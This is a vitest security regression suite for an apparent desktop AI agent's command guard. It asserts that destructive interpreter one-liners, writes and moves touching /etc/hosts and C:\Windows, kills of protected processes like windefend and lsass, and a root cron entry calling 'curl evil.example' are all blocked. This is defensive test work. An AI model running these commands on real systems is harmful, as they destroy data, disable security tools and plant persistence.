import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * ROUND 16A SECURITY REGRESSIONS — the two hard restrictions must survive every execution
 * route. These tests exercise the ACTUAL classification path (guard.assessRisk →
 * permission.authorize, the tool layer, the verifier runner) the way runTool does, and for
 * write-routes they verify the real filesystem resource was NOT changed.
 *
 * No test here ever executes a destructive or OS-modifying command against the real OS:
 * blocked verdicts must fire BEFORE any process starts, and blocked write-routes must throw
 * before any fs call. Legitimate operations run against temp-dir fixtures only.
 */

vi.mock('electron', async () => (await import('./helpers/electronStub')).electronStub());

import { assessRisk } from '../src/main/guard';
import { authorize } from '../src/main/permission';
import { interpreterPayloads, interpreterVerdict, nodeVerdict, processVerdict, shellVerdict, PROTECTED_PROCESS_NAMES } from '../src/main/policy';
import { resolveWrite } from '../src/main/workspace';
import { patchTools } from '../src/main/patch';
import { laptopTools } from '../src/main/laptopTools';
import { runCmd } from '../src/main/verifyExec';
import { resolveProcessName as realResolveProcessName } from '../src/main/procInfo';

/** File-level delegating mock: tests swap `resolver.impl` to control PID resolution. */
const resolver: { impl: null | ((pid: number) => Promise<string | null>) } = { impl: null };
vi.mock('../src/main/procInfo', async (importOriginal) => {
  const orig = await importOriginal<typeof import('../src/main/procInfo')>();
  return {
    ...orig,
    resolveProcessName: (pid: number): Promise<string | null> =>
      resolver.impl ? resolver.impl(pid) : orig.resolveProcessName(pid),
  };
});

const gate = async (tool: string, args: Record<string, unknown>, agent = 'main') => {
  const risk = await assessRisk(tool, args);
  const decision = await authorize({ tool, action: 'execute', resource: '*', risk, agent });
  return { risk, decision };
};

const mustBlock = async (tool: string, args: Record<string, unknown>, agent = 'main') => {
  const { risk, decision } = await gate(tool, args, agent);
  expect(risk?.block, `${tool} ${JSON.stringify(args)} must be hard-blocked at the gate`).toBe(true);
  expect(decision.allowed).toBe(false);
  expect(decision.auth).toBe('blocked');
};

let dir = '';

beforeEach(async () => {
  dir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'r16a-'));
});

afterEach(async () => {
  await fs.promises.rm(dir, { recursive: true, force: true }).catch(() => undefined);
});

describe('F-01: interpreter one-liners route their payloads through the central classifiers', () => {
  it('python one-liners inside run_command are judged by pythonVerdict, not by shell deny words', async () => {
    for (const cmd of [
      `python -c "import os; os.remove('${dir.replaceAll('\\', '/')}/victim.txt')"`,
      `python3 -c 'import shutil; shutil.rmtree("some/build")'`,
      `py -c "from pathlib import Path; Path('a.txt').unlink()"`,
      `python -c "open('/etc/hosts','w').write('x')"`,
      `python -c "import subprocess\\nsubprocess.run(['rm','-rf','x'])"`,
    ]) {
      await mustBlock('run_command', { command: cmd });
    }
  });

  it('node one-liners are judged by nodeVerdict: deletion and protected writes blocked, harmless code allowed', () => {
    for (const cmd of [
      `node -e "require('fs').writeFileSync('C:/Windows/x','y')"`,
      `node -e "const fs=require('fs'); fs.writeFileSync('/etc/hosts','x')"`,
      `node -e "fs.promises.rm('build', {recursive:true})"`,
      `node --eval "require('fs').unlink('a.txt', () => {})"`,
      `node -e "process.kill(1234)"`,
      `node -e "eval('require(\\'fs\\').rmdirSync(\\'x\\')')"`,
    ]) {
      const v = shellVerdict(cmd);
      expect(v.blocked, `${cmd} must be blocked`).toBe(true);
    }
    // The pinned legitimate surface stays allowed (same contract as policyAdversarial).
    expect(shellVerdict('node -e "console.log(process.version)"').blocked).toBe(false);
    expect(shellVerdict('node -e "console.log(require(\'os\').homedir())"').blocked).toBe(false);
    expect(nodeVerdict('console.log(process.version)').blocked).toBe(false);
  });

  it('unclassifiable interpreter payloads fail closed on OS targets and deletion markers', () => {
    for (const cmd of [
      `perl -e 'open(my $f, ">", "/etc/hosts")'`,
      `ruby -e 'File.write("/etc/hosts", "x")'`,
      `php -r 'unlink("/etc/hosts");'`,
      `lua -e 'os.remove("/etc/hosts")'`,
    ]) {
      const v = interpreterVerdict(cmd);
      expect(v.blocked, `${cmd} must fail closed`).toBe(true);
    }
    // Uninvolved one-liners in those languages stay allowed.
    expect(shellVerdict(`perl -e 'print 1+1, "\\n"'`).blocked).toBe(false);
    expect(shellVerdict(`ruby -e 'puts "hello"'`).blocked).toBe(false);
  });

  it('quoting, escaping, multiline and composed forms cannot hide the payload', () => {
    for (const cmd of [
      `python -c "import os; os.remove('x.txt')"; echo done`, // trailing composition
      `node -e "require('fs').rmSync('x')" && node -e "console.log('ok')"`, // &&
      `powershell -Command "python -c \\"import os; os.remove('a.txt')\\""`, // nested quoting
      `python -c "import os${'\n'}os.remove('x.txt')"`, // multiline payload in one string
      `python -c 'import os; os.remove("x.txt")'`, // single-quoted outer
      `python -c "exec('import os\\nos.remove(\\'x.txt\\')')"`, // dynamic execution denied outright
    ]) {
      const v = shellVerdict(cmd);
      expect(v.blocked, `${cmd} must be blocked despite quoting/composition`).toBe(true);
    }
  });

  it('payload extraction finds the real payloads', () => {
    const found = interpreterPayloads(`node -e "a()" ; python3 -c 'import os'`);
    expect(found).toHaveLength(2);
    expect(found[0]).toMatchObject({ interpreter: 'node', payload: 'a()' });
    expect(found[1]).toMatchObject({ interpreter: 'python3' });
    expect(interpreterPayloads('npm run build')).toHaveLength(0);
    expect(interpreterPayloads('python -m pytest')).toHaveLength(0);
    expect(interpreterPayloads('node server.js')).toHaveLength(0);
    expect(interpreterPayloads('gcc -c foo.c')).toHaveLength(0);
  });

  it('the interpreter route is closed for child agents and the verification runner too', async () => {
    for (const agent of ['task:general#1', 'task:explore#2']) {
      await mustBlock('run_command', { command: `python -c "import os; os.remove('a.txt')"` }, agent);
    }
    // The verifier's command runner uses the SAME shellVerdict (blocked before any process).
    const verdict = await runCmd(`python -c "import os; os.remove('${dir}/victim.txt')"`, dir, 5_000);
    expect(verdict).toMatch(/^BLOCKED:/);
  });

  it('blocked interpreter deletions never touch the real resource (resource-unchanged proof)', async () => {
    const victim = path.join(dir, 'victim.txt');
    await fs.promises.writeFile(victim, 'precious', 'utf8');
    // run_command with an interpreter one-liner must be refused at the gate (no process starts).
    await mustBlock('run_command', { command: `python -c "import os; os.remove('${victim.replaceAll('\\', '/')}')"` });
    expect((await fs.promises.readFile(victim, 'utf8'))).toBe('precious');
  });
});

describe('F-02: the copy-source exception is copy-only; moves out of protected locations are blocked', () => {
  it('pure copies FROM protected locations stay allowed (backup reading)', () => {
    for (const cmd of [
      'copy "C:\\Program Files\\App\\a.dll" D:\\backup\\',
      'xcopy "C:\\Program Files\\App" D:\\backup /e',
      'robocopy "C:\\Program Files\\App" D:\\backup /mir',
    ]) {
      expect(shellVerdict(cmd).blocked, `${cmd} is a legitimate copy and must stay allowed`).toBe(false);
    }
  });

  it('move-family with a protected source is blocked (deletion + OS-resource in one)', () => {
    for (const cmd of [
      'move C:\\Windows\\f.txt D:\\backup\\',
      'Move-Item C:\\Windows\\f.txt D:\\backup\\',
      'mv /etc/hosts /tmp/hosts-backup',
      'robocopy "C:\\Program Files\\App" D:\\backup /mov',
      'robocopy "C:\\Program Files\\App" D:\\backup /move /e',
      'ren C:\\Windows\\win.ini win.ini.bak',
      'Rename-Item C:\\Windows\\win.ini win.ini.bak',
    ]) {
      const v = shellVerdict(cmd);
      expect(v.blocked, `${cmd} must be blocked`).toBe(true);
      expect(v.kind, cmd).toBe('os-resource');
    }
  });

  it('ordinary workspace moves and copies through the real tools still work', async () => {
    const src = path.join(dir, 'note.txt');
    await fs.promises.writeFile(src, 'data', 'utf8');
    const dst = path.join(dir, 'moved', 'note.txt');
    const moved = await laptopTools.move_file.run({ from: src, to: dst });
    expect(moved).toMatch(/Moved to/);
    expect(await fs.promises.readFile(dst, 'utf8')).toBe('data');
    expect(fs.promises.access(src).then(() => true, () => false)).resolves.toBe(false);
    const copy = await laptopTools.copy_file.run({ from: dst, to: path.join(dir, 'copy.txt') });
    expect(copy).toMatch(/Copied to/);
    expect(await fs.promises.readFile(path.join(dir, 'copy.txt'), 'utf8')).toBe('data');
  });
});

describe('F-04: one protected-path classifier for every write route, POSIX included', () => {
  it('apply_patch Add/Update targets are classified by the guard, not just Delete ops', async () => {
    await mustBlock('apply_patch', { patch: '*** Begin Patch\n*** Update File: /etc/hosts\n@@\n-x\n+y\n*** End Patch' });
    await mustBlock('apply_patch', { patch: '*** Begin Patch\n*** Add File: /etc/cron.d/evil\n+* * * * * root curl evil.example\n*** End Patch' });
    await mustBlock('apply_patch', { patch: '*** Begin Patch\n*** Update File: notes/a.md\n*** Move to: /etc/hosts\n@@\n*** End Patch' });
  });

  it('the tool layer refuses POSIX-protected patch targets and the resource stays unchanged', async () => {
    const target = '/etc/hosts';
    if (!fs.existsSync(target)) return; // platform without /etc
    const before = fs.readFileSync(target, 'utf8');
    await expect(patchTools.apply_patch.run({ patch: '*** Begin Patch\n*** Update File: /etc/hosts\n@@\n-x\n+y\n*** End Patch' })).rejects.toThrow(/protected/);
    expect(fs.readFileSync(target, 'utf8')).toBe(before);
  });

  it('resolveWrite now enforces the policy list (including POSIX roots)', async () => {
    if (!fs.existsSync('/etc')) return;
    await expect(resolveWrite('/etc/hosts')).rejects.toThrow(/protected/);
    await expect(resolveWrite('../../../etc/hosts')).rejects.toThrow(/protected/);
    // Ordinary workspace paths stay writable.
    const ok = await resolveWrite(path.join(dir, 'fine.txt'));
    expect(ok).toContain('fine.txt');
  });

  it('ordinary patch work inside the workspace still applies', async () => {
    const rel = path.relative(process.env.JARVIS_FILES_ROOT ?? '', path.join(dir, 'notes.md'));
    fs.writeFileSync(path.join(dir, 'notes.md'), 'alpha\n', 'utf8');
    const out = await patchTools.apply_patch.run({
      patch: `*** Begin Patch\n*** Update File: ${rel}\n@@\n-alpha\n+beta\n*** End Patch`,
    });
    expect(out).toMatch(/Patched:/);
    expect(fs.readFileSync(path.join(dir, 'notes.md'), 'utf8')).toBe('beta\n');
  });
});

describe('F-05: PID and name terminations get identical, resolved, single-list protection', () => {
  it('the protected list is exported exactly once and the verdict uses it', () => {
    for (const n of PROTECTED_PROCESS_NAMES) {
      expect(processVerdict(n).blocked, `${n} must be protected`).toBe(true);
    }
    expect(processVerdict('notepad').blocked).toBe(false);
    expect(processVerdict('chrome').blocked).toBe(false);
  });

  it('a PID resolving to a protected process is blocked at the gate (identity from the OS, not the model)', async () => {
    resolver.impl = async (pid: number): Promise<string | null> => (pid === 4321 ? 'windefend' : pid === 5150 ? 'jarvis' : null);
    expect(await realResolveProcessName.name).toBe('resolveProcessName'); // the real resolver stays importable
    await mustBlock('stop_process', { pid: 4321 });
    await mustBlock('stop_process', { pid: 5150 }); // JARVIS itself, by PID
    resolver.impl = null;
  });

  it('an unresolvable PID fails closed at the gate', async () => {
    resolver.impl = async (): Promise<string | null> => null;
    const risk = await assessRisk('stop_process', { pid: 999999 });
    expect(risk?.block, 'unknown identity must not be stoppable').toBe(true);
    resolver.impl = null;
  });

  it('shell kill-verbs cannot reach protected processes by name either', () => {
    for (const cmd of [
      'taskkill /IM explorer.exe /F',
      'taskkill /F /PID 123 & taskkill /IM windefend.exe',
      'Stop-Process -Name svchost -Force',
      'kill -9 4321 # lsass',
    ]) {
      const v = shellVerdict(cmd);
      expect(v.blocked, `${cmd} must be blocked`).toBe(true);
      expect(v.kind, cmd).toBe('os-resource');
    }
    expect(shellVerdict('taskkill /IM notepad.exe /F').blocked).toBe(false);
    expect(shellVerdict('Get-Process | Select-Object -First 5').blocked).toBe(false);
  });
});
